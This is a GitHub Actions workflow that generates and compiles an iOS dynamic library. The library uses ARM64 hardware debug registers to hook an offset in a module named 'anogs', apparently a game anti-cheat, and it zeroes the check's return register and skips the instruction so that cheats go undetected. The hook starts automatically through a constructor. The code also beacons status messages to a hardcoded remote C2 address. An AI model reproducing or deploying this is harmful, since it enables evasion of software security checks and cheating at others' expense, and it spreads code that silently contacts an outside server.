name: Imperial V-MAX - Hardware Breakpoint Hook

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_hw_hook:
    name: Compile Elite Hardware Hook
    runs-on: macos-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Generate C++ Payload (Main.mm)
        run: |
          cat <<'EOF' > main.mm
          #import <Foundation/Foundation.h>
          #import <mach/mach.h>
          #import <mach-o/dyld.h>
          #import <signal.h>
          #import <pthread.h>
          #import <sys/socket.h>
          #import <arpa/inet.h>

          // ⚠️ مسعود سيرفر
          #define C2_IP "44.192.33.117"
          #define C2_PORT 8080

          static uintptr_t g_target_addr = 0;
          static bool g_hw_hook_active = false;

          // إرسال تقرير للسيرفر
          void SendRadarLog(NSString* msg) {
              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                  NSDictionary *data = @{@"func": @"HW_BREAKPOINT", @"offset": @"0x459C", @"target": msg, @"caller": @"Masoud_CPU"};
                  NSData *json = [NSJSONSerialization dataWithJSONObject:data options:0 error:nil];
                  if (!json) return;
                  int sock = socket(AF_INET, SOCK_STREAM, 0);
                  if (sock < 0) return;
                  struct sockaddr_in srv;
                  srv.sin_family = AF_INET; srv.sin_port = htons(C2_PORT);
                  inet_pton(AF_INET, C2_IP, &srv.sin_addr);
                  struct timeval tv = {1, 0}; setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                  if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) send(sock, [json bytes], [json length], 0);
                  close(sock);
              });
          }

          // ==========================================
          // 🧠 مصيدة المعالج (Signal Handler)
          // ==========================================
          void hw_trap_handler(int signum, siginfo_t *info, void *context) {
              // سحب حالة المعالج الحالية وقت حدوث الانفجار
              ucontext_t *uc = (ucontext_t *)context;
              _STRUCT_ARM_THREAD_STATE64 *ss = &uc->uc_mcontext->__ss;

              // هل المعالج توقف عند الأوفست مالتنا؟
              if (ss->__pc == g_target_addr) {
                  // 🔥 السحر هنا: نلعب بالسجلات مباشرة!
                  
                  // 1. نعطي للجاسوس نتيجة "صفر" (كأنما لم يجد هاك)
                  ss->__x[0] = 0; 
                  
                  // 2. نقفز 4 بايتات للأمام (لنتجاوز تعليمة الفحص بأمان)
                  ss->__pc += 4;  
                  
                  SendRadarLog(@"🔥 CPU INTERCEPTED! X0 modified to 0!");
                  // المعالج سيكمل عمله من النقطة الجديدة دون كراش!
              }
          }

          // ==========================================
          // ⚙️ برمجة سجلات المعالج (ARM64 Debug Registers)
          // ==========================================
          void ApplyHardwareBreakpoint() {
              // 1. تفعيل مصيدة الإشارات (Catch SIGTRAP)
              struct sigaction sa;
              sa.sa_sigaction = hw_trap_handler;
              sa.sa_flags = SA_SIGINFO;
              sigemptyset(&sa.sa_mask);
              sigaction(SIGTRAP, &sa, NULL);

              // 2. سحب كل الخيوط (Threads) الفعالة باللعبة
              thread_act_array_t threads;
              mach_msg_type_number_t count;
              if (task_threads(mach_task_self(), &threads, &count) != KERN_SUCCESS) return;

              // 3. المرور على كل خيط وحقن نقطة التوقف العتادية
              for (int i = 0; i < count; i++) {
                  arm_debug_state64_t dbg;
                  mach_msg_type_number_t dbg_count = ARM_DEBUG_STATE64_COUNT;
                  
                  if (thread_get_state(threads[i], ARM_DEBUG_STATE64, (thread_state_t)&dbg, &dbg_count) == KERN_SUCCESS) {
                      
                      // السجل الأول: عنوان الأوفست مالتنا
                      dbg.__bvr[0] = g_target_addr;
                      
                      // السجل الخاص بالتحكم: 0x1E5 تعني (تفعيل، في وضع المستخدم EL0، لأربع بايتات)
                      dbg.__bcr[0] = 0x1E5; 
                      
                      // تطبيق الحالة الجديدة على المعالج
                      thread_set_state(threads[i], ARM_DEBUG_STATE64, (thread_state_t)&dbg, ARM_DEBUG_STATE64_COUNT);
                  }
              }
              
              // تحرير الذاكرة
              vm_deallocate(mach_task_self(), (vm_address_t)threads, count * sizeof(thread_act_t));
              
              SendRadarLog(@"⚙️ Hardware Breakpoints Injected to CPU Registers!");
          }

          // ==========================================
          // 🚀 المترصد (يبحث عن Anogs بصمت)
          // ==========================================
          void StartHardwareSniper() {
              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
                  while (!g_hw_hook_active) {
                      for (uint32_t i = 0; i < _dyld_image_count(); i++) {
                          if (strstr(_dyld_get_image_name(i), "anogs")) {
                              uintptr_t base_addr = (uintptr_t)_dyld_get_image_header(i);
                              
                              // تحديد الهدف
                              g_target_addr = base_addr + 0x459C; 
                              
                              sleep(1); // استقرار الذاكرة
                              ApplyHardwareBreakpoint(); // ضرب المعالج
                              
                              g_hw_hook_active = true;
                              break;
                          }
                      }
                      if (!g_hw_hook_active) sleep(1);
                  }
              });
          }

          __attribute__((constructor))
          static void init_elite_hook() {
              SendRadarLog(@"🦅 ELITE CPU HOOK INITIALIZED!");
              StartHardwareSniper();
          }
          EOF

      - name: Compile Elite Hardware Hook
        run: |
          clang++ -dynamiclib -std=c++11 -arch arm64 \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          main.mm -o Masoud-Elite-HW-Hook.dylib \
          -framework Foundation
          strip -x Masoud-Elite-HW-Hook.dylib

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Masoud-Elite-HW-Hook
          path: Masoud-Elite-HW-Hook.dylib
